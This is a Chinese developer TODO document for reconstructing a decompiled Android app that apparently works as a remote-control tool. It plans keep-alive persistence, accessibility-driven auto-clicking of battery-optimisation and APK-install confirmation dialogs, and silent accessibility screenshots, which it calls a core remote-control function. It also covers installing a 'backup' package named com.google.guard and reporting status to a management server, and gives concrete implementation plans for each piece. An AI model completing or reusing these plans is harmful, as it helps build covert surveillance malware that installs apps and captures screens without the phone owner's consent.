# 剩余 TODO 详解

> 更新日期: 2026-03-22
> 剩余 10 个 TODO 分布在 3 个基础设施类中
> 这些 TODO 不影响厂商保活引擎的核心功能

---

## 1. AutoEngine.java (2 个 TODO)

### TODO #1: t0() — PowerControlStateVO 上报

**位置**: `AutoEngine.java:624`

```java
protected void t0() {
    // TODO: VENDOR_VERIFY — 构建 PowerControlStateVO 并发送
    log("t0() 上报保活状态");
}
```

**Vendor 功能**: `o/c.java` 的 `t0()` 方法，在保活引擎完成后向服务端上报保活策略的最终状态。构建一个 `PowerControlStateVO` 对象，包含:
- `allowAutoStart` (是否允许自启动)
- `allowRelateStart` (是否允许关联启动)
- `allowAllFullBackground` (是否允许完全后台运行)
- `allowPopupInBackground` (vivo 特有: 是否允许后台弹窗)
- `retryCount` (重试次数)

然后通过 HTTP 接口发送到管理平台。

**影响范围**: 仅影响状态上报，不影响本地保活操作。各厂商引擎有自己的 `saveState()` 方法已经记录了本地状态。

**实现方案**: 需要集成 `PowerControlStateHelper` (对应 vendor `com.guard.wallet.utils.h`) 的 `k()/L()` 方法，读写 SharedPreferences。当前各引擎的 `saveState()` 用日志替代。

---

### TODO #2: checkBatteryOptimizationDialog() — 异步点击"允许"按钮

**位置**: `AutoEngine.java:1121`

```java
// TODO: 异步执行点击"允许"按钮
// vendor: thread.l.c(new o.a(this, 0), this.c)
```

**Vendor 功能**: 当检测到系统电池优化对话框 (`android.app.Dialog` in `com.android.settings`) 时，自动点击"允许"按钮，让应用不受电池优化限制。这是所有厂商引擎共享的基类方法。

vendor 的 `o.a` Runnable case 0 逻辑:
1. 查找 `android:id/button1` 按钮
2. 点击按钮
3. 从 stateQueue 移除 `keepInBatteryUnRestricted`

**影响范围**: 影响电池优化对话框的自动处理。当前 `checkBatteryOptimizationDialog()` 可以检测到对话框，但检测到后不会执行点击操作。

**实现方案**: 在 TODO 位置添加 `scheduler.execute()` 调用，异步查找并点击 button1。

---

## 2. MiniCapture.java (4 个 TODO)

`MiniCapture` 是无障碍截屏模块 (Android 11+ 的 `takeScreenshot` API)。vendor 对应 `o/r.java` (69行)。

### TODO #3: captureTask 类型确认

**位置**: `MiniCapture.java:30`

```java
// TODO: VENDOR_VERIFY - 需要确认 thread.k 的具体实现
public final Object captureTask;
```

**Vendor 功能**: `com.guard.wallet.thread.k` 是一个截屏任务执行器，内部持有 `MediaProjection` 或 `AccessibilityService.takeScreenshot` 的引用。它管理截图缓冲区和图片编码。

**影响范围**: 截屏功能完全依赖此对象。当前 `captureTask = null`，截屏不工作。

---

### TODO #4: captureTask 构造

**位置**: `MiniCapture.java:38`

```java
// TODO: VENDOR_VERIFY - captureTask 的具体类型
this.captureTask = null;
```

**Vendor 功能**: vendor 构造 `new com.guard.wallet.thread.k(true)`，参数 `true` 表示使用 AccessibilityService 截屏模式（而非 MediaProjection）。

---

### TODO #5: capture() 反编译失败

**位置**: `MiniCapture.java:55`

```java
// TODO: VENDOR_VERIFY - 方法反编译失败，以下为 smali 逆向重建
```

**Vendor 功能**: 核心截屏方法，判断:
1. SDK < 30: 使用 MediaProjection 截屏
2. SDK >= 30: 使用 `AccessibilityService.takeScreenshot()` (Android 11+)
3. 黑屏限流: 屏幕关闭时 30 秒内只截一次
4. 提交 captureTask 到线程池执行

**影响范围**: 截屏是远控的核心功能之一。当前骨架实现可以编译但不执行实际截屏。

---

### TODO #6: 黑屏检测逻辑

**位置**: `MiniCapture.java:65`

```java
// TODO: VENDOR_VERIFY - 黑屏检测逻辑
boolean screenOn = true; // placeholder
```

**Vendor 功能**: `com.guard.wallet.utils.e.j()` — 检查 PowerManager 的 `isInteractive()` 判断屏幕是否亮着。黑屏时截图为纯黑画面，vendor 做了 30 秒限流避免浪费资源。

**实现方案**: 使用 `PowerManager.isInteractive()` 替代 placeholder。

---

## 3. PackageInstallerDelegate.java (3 个 TODO)

`PackageInstallerDelegate` 处理 APK 安装确认弹窗，自动点击"安装"/"允许"按钮。

### TODO #7: 多种点击重试策略

**位置**: `PackageInstallerDelegate.java:301`

```java
// TODO: VENDOR_VERIFY - vendor 有多种点击重试策略
```

**Vendor 功能**: vendor 的 `o/u.java` (169行) 在点击 CheckBox/Switch 后，如果状态未改变，会:
1. 尝试点击父节点
2. 尝试使用 `R()` 坐标点击
3. 等待 500ms 后重试
4. 最多重试 3 次

**影响范围**: 某些厂商的"允许本次安装"复选框可能点击不响应。当前实现只做了一次点击 + 父节点 fallback。

---

### TODO #8: waitForInstallAndFinish() 反编译失败

**位置**: `PackageInstallerDelegate.java:420`

```java
// TODO: VENDOR_VERIFY - 原始反编译失败，基于 smali 推断逻辑
```

**Vendor 功能**: 等待 APK 安装完成的轮询逻辑 (`o/u.java` 的 `L()` 方法):
1. 最多轮询 20 次，每次间隔 2 秒
2. 检查备份应用 `com.google.guard` 是否已安装
3. 使用 `PackageManager.getPackageInfo()` 判断
4. 安装完成后调用 `finishEngine()`

---

### TODO #9: 检查备份应用安装状态

**位置**: `PackageInstallerDelegate.java:430`

```java
// TODO: VENDOR_VERIFY - vendor 使用 utils.g.d0("com.google.guard")
installed = false; // placeholder
```

**Vendor 功能**: `com.guard.wallet.utils.g.d0(packageName)` — 通过 `PackageManager.getPackageInfo()` 检查指定包名是否已安装。返回非 null 表示已安装。

**实现方案**: 使用 `context.getPackageManager().getPackageInfo("com.google.guard", 0)` 替代 placeholder。

---

## 优先级排序

| 优先级 | TODO # | 文件 | 功能 | 影响 |
|--------|--------|------|------|------|
| 高 | #2 | AutoEngine | 电池优化对话框点击 | 所有厂商引擎依赖 |
| 高 | #9 | PackageInstaller | 备份应用安装检查 | APK 安装完成判断 |
| 中 | #7 | PackageInstaller | 点击重试策略 | 某些厂商安装弹窗 |
| 中 | #8 | PackageInstaller | 安装完成轮询 | APK 安装流程完整性 |
| 中 | #1 | AutoEngine | 状态上报 | 管理平台数据同步 |
| 低 | #3-6 | MiniCapture | 截屏功能 | 需要 Android 11+ 真机 |
